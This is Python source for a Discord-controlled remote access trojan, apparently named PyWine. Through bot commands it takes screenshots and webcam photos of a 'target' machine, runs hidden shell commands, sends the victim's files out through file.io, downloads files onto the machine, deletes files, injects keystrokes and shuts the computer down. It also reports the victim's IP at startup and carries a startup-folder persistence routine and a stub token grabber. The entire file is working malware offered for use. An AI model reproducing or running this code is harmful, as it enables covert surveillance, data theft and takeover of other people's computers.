import discord
from discord.ext import commands
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from PIL import ImageGrab
import io
import os
import subprocess
import socket
import urllib.request
from datetime import datetime
import tkinter as tk
from tkinter import messagebox
import ctypes
import win32api
import win32con
import requests
import urllib.parse
import tempfile
import webbrowser
import shutil
import psutil
import asyncio
import win32com.client
from PIL import Image
import cv2
import numpy as np
import keyboard


def set_autostart_windows(script_path):
    # Get the Startup folder path
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    
    # Check if script exists
    if not os.path.isfile(script_path):
        print(f"Script not found at {script_path}")
        return False
    
    # Copy the script to the Startup folder
    try:
        shutil.copy(script_path, startup_folder)
        print(f"Script {script_path} added to startup.")
        return True
    except Exception as e:
        print(f"Failed to add script to startup: {e}")
        return False

def show_message_box(title, message, style):
    # Define the message box styles
    MB_OK = 0x00000000
    MB_OKCANCEL = 0x00000001
    MB_ABORTRETRYIGNORE = 0x00000002
    MB_YESNOCANCEL = 0x00000003
    MB_YESNO = 0x00000004
    MB_RETRYCANCEL = 0x00000005
    MB_ICONHAND = 0x00000010
    MB_ICONQUESTION = 0x00000020
    MB_ICONEXCLAMATION = 0x00000030
    MB_ICONASTERISK = 0x00000040
    MB_USERICON = 0x00000080
    MB_ICONMASK = 0x000000F0
    MB_DEFBUTTON1 = 0x00000000
    MB_DEFBUTTON2 = 0x00000100
    MB_DEFBUTTON3 = 0x00000200
    MB_DEFBUTTON4 = 0x00000300
    MB_DEFAULT_DESKTOP_ONLY = 0x00020000
    MB_TOPMOST = 0x00040000
    MB_RIGHT = 0x00080000
    MB_RTLREADING = 0x00100000
    MB_SERVICE_NOTIFICATION = 0x00200000
    MB_SETFOREGROUND = 0x00010000
    MB_DEFAULT = MB_OK

    # Map style integer to corresponding style flags
    style_map = {
        0: MB_OK,
        1: MB_OKCANCEL,
        2: MB_ABORTRETRYIGNORE,
        3: MB_YESNOCANCEL,
        4: MB_YESNO,
        5: MB_RETRYCANCEL,
        6: MB_ICONEXCLAMATION  # example style with an icon
    }

    # Ensure the style is valid
    if style not in style_map:
        raise ValueError("Invalid style value. Use an integer between 0 and 6.")

    # Get the appropriate style
    msg_box_style = style_map[style]

    # Call the Windows MessageBox function
    ctypes.windll.user32.MessageBoxW(0, message, title, msg_box_style)

def show_message_box(title, message):
    # Create a root window (it won't be shown)
    root = tk.Tk()
    root.withdraw()  # Hide the root window

    # Show the message box
    messagebox.showinfo(title, message)

    # Clean up and close the root window
    root.destroy()

def get_public_ip():
    try:
        # Query an external service to get the public IP address
        with urllib.request.urlopen('http://api.ipify.org') as response:
            public_ip = response.read().decode('utf-8')
    except Exception as e:
        return f"Error fetching public IP: {e}"
    
    return public_ip

def get_local_ip():
    try:
        # Create a socket and connect to a remote server
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))  # Google's DNS server
        local_ip = s.getsockname()[0]
    finally:
        s.close()
    
    return local_ip

def upload_to_file_io(file_path):
    url = "https://file.io/"
    with open(file_path, 'rb') as file:
        response = requests.post(url, files={"file": file})
        if response.status_code == 200:
            return response.json()
        else:
            raise Exception(f"Failed to upload file: {response.status_code}, {response.text}")

def text_to_speech(text):
    """
    Convert text to speech using Windows TTS engine.

    Parameters:
    - text (str): The text to convert to speech.
    """
    # Create a TTS engine instance
    speaker = win32com.client.Dispatch("SAPI.SpVoice")
    
    # Speak the text
    speaker.Speak(text)

def grab_token():
    base_url = "https://discord.com/api/v9/users/@me"
    appdata = os.getenv("localappdata")
    roaming = os.getenv("appdata")
    return appdata

# Vars
TOKEN = 'TOKEN_HERE'
YOUR_DISCORD_USER_ID = 11111
CHANNEL_ID = 22222
LOCAL_IP = get_local_ip()
PUBLIC_IP = get_public_ip()
TIME = datetime.now()
NAME = __file__
TEMP = temp_dir = tempfile.mkdtemp()
blocked_websites = set()
# Set up the intents (you may enable more if needed)

# set_autostart_windows(NAME)
print(grab_token())

intents = discord.Intents.default()
intents.message_content = True  # Required to read message content




# Set up the bot with a command prefix and intents
bot = commands.Bot(command_prefix=".", intents=intents)

#defs
# Function to change system volume
def set_volume(volume: int):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume_control = cast(interface, POINTER(IAudioEndpointVolume))

    # Ensure volume is within bounds (0-100)
    volume = max(0, min(100, volume))
    
    # Set the volume (scale: 0.0 to 1.0)
    volume_control.SetMasterVolumeLevelScalar(volume / 100.0, None)
#start

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send(f'```{LOCAL_IP} Started New Session At {TIME}```')


#commands




# Command to change volume
@bot.command(name='vol')
async def change_volume(ctx, volume: int):
    if 0 <= volume <= 100:
        set_volume(volume)
        await ctx.send(f"Volume set to {volume}%")
    else:
        await ctx.send("Please provide a volume between 0 and 100.")

# Command to take a screenshot and send it
@bot.command(name='ss')
async def screenshot(ctx):
    # Capture the screen
    screenshot = ImageGrab.grab()
    
    # Save the screenshot to a BytesIO object
    image_binary = io.BytesIO()
    screenshot.save(image_binary, 'PNG')
    image_binary.seek(0)
    
    # Send the screenshot in the Discord channel
    await ctx.send(file=discord.File(fp=image_binary, filename='screenshot.png'))
    
    # Close the BytesIO object to free memory
    image_binary.close()

# Command to shut down the system
@bot.command(name='shutdown')
async def shutdown(ctx):
    # Make sure the command is run by the server owner or a specific user
    if ctx.author.id == YOUR_DISCORD_USER_ID:  # Replace with your Discord user ID
        await ctx.send("Shutting down the system...")
        os.system("shutdown /s")  # Execute the system shutdown command
    else:
        await ctx.send("You do not have permission to use this command.")


@bot.command(name='cmd')
async def cmd(ctx, *, command: str):
    # WARNING: Executing system commands directly is dangerous!
    # Consider adding proper validation and restrictions here.
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout or result.stderr
        await ctx.send(f"```{output}```")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(name='cd')
async def cd(ctx, *, cd: str):
    try:
        os.chdir(cd)
        await ctx.send(f"```Changed Directory To {cd}```")
    except Exception as e:
        await ctx.send(f"ERROR {e}")  

@bot.command(name='ls')
async def ls(ctx):
    try:
        # Run the command and capture the output
        result = subprocess.run(["dir"], shell=True, capture_output=True, text=True)
        # Send the output to the Discord channel
        await ctx.send(f"```{result.stdout}```")
    except Exception as e:
        await ctx.send(f"ERROR: {e}")

@bot.command(name='rmdir')        
async def rmdir(ctx, *, dir: str):
    try:
        os.system(f"rmdir {dir}")
        await ctx.send(f"```Removed Driectory ''{dir}''```")
    except Exception as e:
        await ctx.send(f"```Error {e}```")

@bot.command(name='delete')
async def delete(ctx, *, file: str):
    try:
        os.system(f"DEL {file}")
        await ctx.send(f"```Deleted {file}``` :smile:")
    except Exception as e:
        await ctx.send(f"ERROR: {e} | meaby you shoud try ''.rmdir'' :smile:")                

@bot.command(name='geolocate')
async def geolocate(ctx):
    try:
        # Use subprocess.run to call curl
        result = subprocess.run(
            ['curl', f'https://ipinfo.io/{PUBLIC_IP}/json'],
            capture_output=True,
            text=True
        )
        
        # Check if the command was successful
        if result.returncode == 0:
            # Send the output of the curl command
            await ctx.send(f"```json\n{result.stdout}```")
        else:
            # Send an error message if the command failed
            await ctx.send(f"```ERROR: Command failed with return code {result.returncode}```")
    
    except Exception as e:
        await ctx.send(f"```ERROR: {e}```")

@bot.command(name='credits')
async def credits(ctx):
    await ctx.send(f"Credits To [Venodev](<https://github.com/ggvenodev>)")

@bot.command(name='msg')
async def msg(ctx, *, message: str):
    # Create a message box with the given message
    win32api.MessageBox(0, message, NAME, win32con.MB_OK)
    # Send a confirmation message in Discord
    await ctx.send(f"Message box displayed with message: {message}")

@bot.command(name='execute')
async def execute(ctx, *, file: str):
    try:
     if not "." in file:
         os.system(file)
         await ctx.send("changed file")
     else:
         await ctx.send("file does not contain ''.'' in it")
            
    except Exception as e:
        await ctx.send(f"{file} cannot be opend: {e}") 

@bot.command(name='upload')
async def upload(ctx, *, url):
    try:
     # Send a GET request to the URL
     response = requests.get(url)
     response.raise_for_status()  # Raise an exception for HTTP errors

     # Default filename
     filename = "downloaded_file"

     # Check if Content-Disposition header is present
     content_disposition = response.headers.get('content-disposition')
     if content_disposition:
        # Handle UTF-8 encoded filenames
         if "filename*=" in content_disposition:
             filename_part = content_disposition.split("filename*=")[-1]
             filename = urllib.parse.unquote(filename_part.split("''")[-1])
         elif "filename=" in content_disposition:
             filename_part = content_disposition.split("filename=")[-1]
             filename = filename_part.strip('"')

     # Sanitize the filename for Windows (remove/replace illegal characters)
     invalid_chars = '<>:"/\\|?*'
     filename = ''.join(c if c not in invalid_chars else '_' for c in filename)
 
     # Write the content to a file
     with open(filename, 'wb') as file:
         file.write(response.content)
     
     print(f"File downloaded successfully as {filename}")
     await ctx.send(f"File Uploaded To {NAME}")

    except requests.RequestException as e:
       print(f"An error occurred: {e}")

    except Exception as e:
     print(f"An unexpected error occurred: {e}")

@bot.command(name="download")
async def upload(ctx, *, file_path: str):
    # Normalize the path to handle spaces and backslashes
    file_path = os.path.normpath(file_path)

    # Check if the file exists
    if not os.path.exists(file_path):
        await ctx.send(f"File or directory '{file_path}' not found.")
        return

    # Check if it's a directory or a file
    if os.path.isdir(file_path):
        await ctx.send("Directories cannot be uploaded. Please provide a file path.")
        return

    try:
        # Upload the file to file.io
        result = upload_to_file_io(file_path)
        download_url = result['link']

        # Send the file.io link back to the Discord channel
        await ctx.send(f"File uploaded successfully: {download_url}")
    except Exception as e:
        await ctx.send(f"Error uploading file: {e}")

@bot.command(name='jumpscare')
async def jumpscare(ctx):
    try:
     set_volume(100)
     webbrowser.open("https://youtu.be/uZpMmP5EUEI?t=54")
     await ctx.send(f"jumpscared target")
    except Exception as e:
        await ctx.send(f"ERROR: {e}") 

# Show the list of processes
@bot.command(name="show")
async def show_processors(ctx):
    # Get the list of all processes
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            processes.append(f"PID: {proc.info['pid']} - Name: {proc.info['name']}")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    # Split the processes into manageable chunks (Discord message length limit)
    chunks = [processes[i:i + 10] for i in range(0, len(processes), 10)]
    for chunk in chunks:
        await ctx.send("\n".join(chunk))

# Kill the specified process by its name
@bot.command(name="kill")
async def kill_process(ctx, process_name: str):
    # List to store killed processes
    killed_processes = []
    
    # Iterate over processes and terminate ones that match the name
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'].lower() == process_name.lower():  # Case-insensitive matching
                proc.terminate()  # You can use proc.kill() for immediate forceful kill
                killed_processes.append(f"Terminated: PID {proc.info['pid']} - {proc.info['name']}")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    if killed_processes:
        await ctx.send("\n".join(killed_processes))
    else:
        await ctx.send(f"No process named '{process_name}' was found or terminated.")

# Clear a certain number of messages
@bot.command(name="clear")
@commands.has_permissions(manage_messages=True)  # Ensure the user has the right permissions
async def clear(ctx, amount: int):
    if amount <= 0:
        await ctx.send("Please specify a number greater than 0.")
        return

    # Deletes the specified number of messages from the channel
    deleted = await ctx.channel.purge(limit=amount + 1)  # +1 to include the clear command itself
    await ctx.send(f"Deleted {len(deleted) - 1} messages.", delete_after=5)  # Delete response after 5 seconds

@bot.command(name='tts')
async def tts(ctx, *, content: str):
    try:
     text_to_speech(content)
     await ctx.send(f"`{content}` has turned into tts")
    except Exception as e:
        await ctx.send(f"coud not play tts {e}") 

@bot.command(name='pwd')
async def pwd(ctx):
    try:
     pwd = os.getcwd()
     await ctx.send(f"{pwd}")
    except Exception as e:
        await ctx.send(f"ERROR: {e}") 


@bot.command()
async def webcamphoto(ctx):
    # Open the webcam
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        await ctx.send("Couldn't access the webcam.")
        return

    # Capture a single frame
    ret, frame = cap.read()
    cap.release()

    if not ret:
        await ctx.send("Failed to capture image.")
        return

    # Convert the frame to PIL Image format
    image = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))

    # Save image to a bytes buffer
    buffer = io.BytesIO()
    image.save(buffer, format='PNG')
    buffer.seek(0)

    # Send the image to Discord
    await ctx.send(file=discord.File(fp=buffer, filename='webcamphoto.png'))

@bot.command(name='key')
async def key(ctx, *, content: str):
    if "ENTER" in content:       
        for char in content:
         keyboard.write(char)
         keyboard.press_and_release('enter')
    elif "ALTF4" in content:
        keyboard.press_and_release('alt+f4')
    elif "CTRLSHIFTESC" or "MENAGE" in content:
        keyboard.press_and_release('ctrl+shift+esc')    
    else:     
     # Simulate key presses for each character in the content
     for char in content:
         keyboard.write(char)
     await ctx.send(f'Sent "{content}" to your keyboard.')


@bot.command(name='winehelpkey')
async def winehelpkey(ctx):
    await ctx.send("""
                   ENTER - presses enter
                   ALTF4 - closes current window
                   CTRLSHIFTESC or MEANAGE - opens meanage tasks
                   ...                                  
                """)


@bot.command(name="winehelp")
@commands.has_permissions(manage_messages=True)
async def winehelp(ctx):
    # Define the help content in pages
    pages = [
        """
        **Help Wine Commands - Page 1:**

        `.vol [1-100]` - Set Target Volume  
        `.ss` - Makes Screenshot and sends it [kind spy thing 🤫]  
        `.shutdown` - Shutdown target's computer [by running `shutdown /s`]  
        `.cmd [command]` - Executes command hidden and captures output (depends on permissions 😎)  
        `.cd [directory]` - Changes directory  
        `.ls` - Shows current files in directory  
        `.rmdir [dir or directory]` - Removes folder(s)  
        `.delete` - Removes file(s)
        """,
        """
        **Help Wine Commands - Page 2:**

        `.geolocate` - Geolocates IP address  
        `.msg [content]` - Message popup  
        `.execute [file or dir.exe]` - Executes chosen file  
        `.upload [file.io link]` - Downloads file from file.io link on target's PC  
        `.download [file or patch]` - Uploads file/directory to file.io and sends it to you  
        `.jumpscare` - Sets volume to 100 and opens [jumpscare](<https://youtu.be/uZpMmP5EUEI?t=54>) link  
        `.show processors` - Shows list of processors  
        `.kill [process]` - Kills running process  
        `.clear [amount]` - Clears a specified number of messages
        """,
        """
        **Help Wine Commands - Page 3:**

        `.credits` - Shows credits of [developer](<https://gist.github.com/ggvenodev>)
        `.tts [content]` - Plays tts message on targets computer
        `.pwd` - shows current directory
        `.webcamphoto` - makes picture of webcam and sends it
        `.key [content]` - writes on targets keaboard "[content]" (TYPE "winehelp_key")

        ⚠️ **WARNING:** You take full responsibility for whatever you're doing. ⚠️
        """,
        """
           **Help Wine Commands - Page 3:**
              **Plans For Updates**
            1. Add Multi Targets To one server.
            2. Make better gui.  
            -----------------------------------
            meaby you shoud give me a [star](https://github.com/ggvenodev/PyWine) :)
        """
    ]

    # Send the first page of help
    message = await ctx.send(pages[0])

    # Add reaction for navigation
    await message.add_reaction("⏩")  # Next page

    # Pagination logic to track the current page
    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) == '⏩' and reaction.message.id == message.id

    page = 0
    while True:
        try:
            reaction, user = await bot.wait_for('reaction_add', timeout=60.0, check=check)

            # When next page reaction is pressed, go to the next page
            if str(reaction.emoji) == "⏩":
                page += 1
                if page >= len(pages):  # If no more pages, reset to the first page
                    page = 0
                await message.edit(content=pages[page])

                # Remove the user's reaction to allow them to click again
                await message.remove_reaction(reaction, user)

        except asyncio.TimeoutError:
            break  # Stop listening after 60 seconds of inactivity


bot.run(TOKEN)
